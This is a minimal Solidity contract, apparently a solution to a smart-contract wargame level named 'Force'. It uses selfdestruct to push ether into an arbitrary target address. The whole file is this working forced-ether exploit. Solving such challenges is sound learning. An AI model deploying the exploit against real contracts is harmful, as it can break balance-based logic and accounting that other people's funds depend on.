//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Force {
    address public targetAddress;

    function target (address meow) public {
        targetAddress = meow;
    }

    receive() external payable {
        selfdestruct(payable(targetAddress));
    }

}
